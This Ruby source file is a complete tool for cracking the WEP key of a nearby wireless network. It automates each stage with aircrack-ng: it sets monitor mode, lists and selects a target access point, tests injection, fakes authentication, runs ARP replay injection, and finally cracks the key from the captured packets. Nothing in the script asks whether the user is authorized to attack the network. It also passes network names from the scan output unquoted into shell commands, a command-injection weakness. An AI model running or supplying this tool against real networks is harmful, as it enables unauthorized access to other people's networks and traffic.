#TODO: add shebang declaration

require 'open3'

def user_is_root?
  begin
    uid = `id -u`.to_i
  rescue ArgumentError
    puts "Fatal error: this script will not work."
    return false
  end
  return true if uid == 0
  puts "This script needs to be run in root mode."
  return false
end

def run_command(cmd)
  puts "=> #{cmd}"
  stdin, stdout, stderr = Open3.popen3(cmd)
  stderr.each_line {}
  return stdout
end

def select_from_list(list)
  i = 1
  list.each do |item|
    puts "#{i}) #{item}"
    i += 1
  end
  num = 0
  valid_input = false
  until valid_input do
    print "> "
    num = gets.to_i
    valid_input = num > 0 && num <= list.length
    puts "Please enter a number between 1 and #{list.length}" unless valid_input
  end
  return num - 1
end


class APInfo
  attr_reader :bssid, :essid, :channel, :beacons, :packets
  def initialize(bssid, essid, channel, beacons, packets)
    @bssid = bssid
    @essid = essid
    @channel = channel
    @beacons = beacons
    @packets = packets
  end
end

def isbssid?(str)
  return str =~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/
end

def select_wifi
  stdout = run_command('iwconfig')
  interfaces = []
  stdout.each_line do |line|
    next if line =~ /^\s/
    interfaces << line.split[0]
  end
  if interfaces.length == 0
    puts "Error: no wireless interfaces detected"
    return nil
  elsif interfaces.length == 1
    puts "Detected wireless interface '#{interfaces[0]}'"
    return interfaces[0]
  else
    puts "Multiple wireless interfaces found. Please select interface:"
    return interfaces[select_from_list(interfaces)]
  end
end

def set_monitor_mode(wifi_id, channel = nil)
  cmd = "airmon-ng start #{wifi_id}"
  cmd += " #{channel}" if channel
  stdout = run_command(cmd)
  mon_regex =  /\(monitor mode enabled on (.+)\)$/
  if_regex = /(\S+).+\(monitor mode enabled\)$/
  stdout.each_line do |line|
    m = mon_regex.match(line)
    m = if_regex.match(line) unless m
    next unless m
    print "Monitor mode entabled on '#{m[1]}'"
    print " for channel #{channel}" if channel
    puts
    return m[1]
  end
  puts "Error: could not set monitor mode"
  return nil
end

def stop_monitor_mode(monitor_interface)
  stdout = run_command("airmon-ng stop #{monitor_interface}")
  stdout.each_line {}
  puts "Monitor mode removed from '#{monitor_interface}'"
end

def parse_aps(filename)
  f = File.new(filename);
  found_aps = []
  f.each_line do |line|
   items = line.split(",")
   items.each { |item| item.strip! }
   next if items.length < 14  # skip empty lines
   next unless isbssid?(items[0])
   found_aps << APInfo.new(items[0], items[13], items[3], items[9], items[10])
  end
  f.close();
  found_aps
end

def select_access_point(monitor_interface)
  `rm -f wcrb-*`
  puts "Press [enter] to start monitoring access points."
  puts "  When done, press Ctrl-C and select AP from list."
  print "> "
  gets
  cmd = "airodump-ng -w wcrb #{monitor_interface}"
  puts "=> #{cmd}"
  system(cmd)
  puts
  aplist = parse_aps('wcrb-01.txt')
  `rm -f wcrb-*`
  ap_descs = []
  aplist.each do |apinfo|
    ap_descs << "#{apinfo.essid}: #{apinfo.beacons} beacons, #{apinfo.packets} packets"
  end
  puts "Select AP from list. More beacons usually means the AP is closer."
  return aplist[select_from_list(ap_descs)]
end

def ask_continue(monitor_interface)
  print "Continue? [Y/n] > "
  if gets.strip =~ /^[nN]/
    stop_monitor_mode(monitor_interface)
    return false
  end
  return true
end

def test_injection(apinfo, monitor_interface)
  puts "Testing injection for the selected settings"
  cmd = "aireplay-ng -9 -e #{apinfo.essid} -a #{apinfo.bssid} #{monitor_interface}"
  puts "=> #{cmd}"
  system(cmd)
  puts "If no packets were injected, consider starting over and choosing a different AP."
  return ask_continue(monitor_interface)
end

def open_capture_window(apinfo, monitor_interface)
  puts "Opening packet capture in separate window"
  cmd = "airodump-ng -c #{apinfo.channel} --bssid #{apinfo.bssid} -w wcrb #{monitor_interface}"
  cmd = "gnome-terminal --geometry 100x25-0+0 --execute #{cmd} &"
  puts "=> #{cmd}"
  system(cmd)
end

def authenticate_with_ap(apinfo, monitor_interface)
  puts "About to attempt authentication. This is the most critical step."
  cmd = "aireplay-ng -1 0 -e #{apinfo.essid} -a #{apinfo.bssid} #{monitor_interface}"
  puts "=> #{cmd}"
  system(cmd)
  puts "If authentication failed, you can retry wit a different AP."
  return ask_continue(monitor_interface)
end

def open_inject_window(apinfo, monitor_interface)
  puts "Opening packet injection in separate window"
  cmd = "aireplay-ng -3 -b #{apinfo.bssid} #{monitor_interface}"
  cmd = "gnome-terminal --geometry 100x25-0-0 --execute #{cmd} &"
  puts "=> #{cmd}"
  system(cmd)
end

def crack_key(apinfo)
  puts "Press [enter] to begin cracking attempt"
  print "> "
  gets
  cmd = "aircrack-ng -b #{apinfo.bssid} wcrb*.cap"
  puts "=> #{cmd}"
  system(cmd)
end

def main
  return unless user_is_root?
  wifi_id = select_wifi()
  return unless wifi_id
  monitor_interface = set_monitor_mode(wifi_id)
  apinfo = select_access_point(monitor_interface)
  stop_monitor_mode(monitor_interface)
  monitor_interface = set_monitor_mode(wifi_id, apinfo.channel)
  return unless test_injection(apinfo, monitor_interface)
  open_capture_window(apinfo, monitor_interface)
  return unless authenticate_with_ap(apinfo, monitor_interface)
  open_inject_window(apinfo, monitor_interface)
  crack_key(apinfo)
  stop_monitor_mode(monitor_interface)
end

main
